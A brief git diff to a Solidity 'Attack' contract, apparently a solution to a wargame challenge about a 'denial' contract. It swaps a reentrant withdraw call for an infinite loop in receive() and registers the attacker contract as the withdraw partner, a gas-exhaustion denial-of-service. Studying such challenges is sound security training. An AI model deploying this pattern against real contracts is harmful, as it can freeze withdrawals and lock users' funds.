@@ -11,12 +11,11 @@ contract Attack {
     }
 
     receive() external payable {
-        denial.withdraw();
+        while(true){}
     }
 
     function exploit() public {
-        denial.setWithdrawPartner(msg.sender);
-        denial.withdraw();
+        denial.setWithdrawPartner(address(this));
     }
 }
 
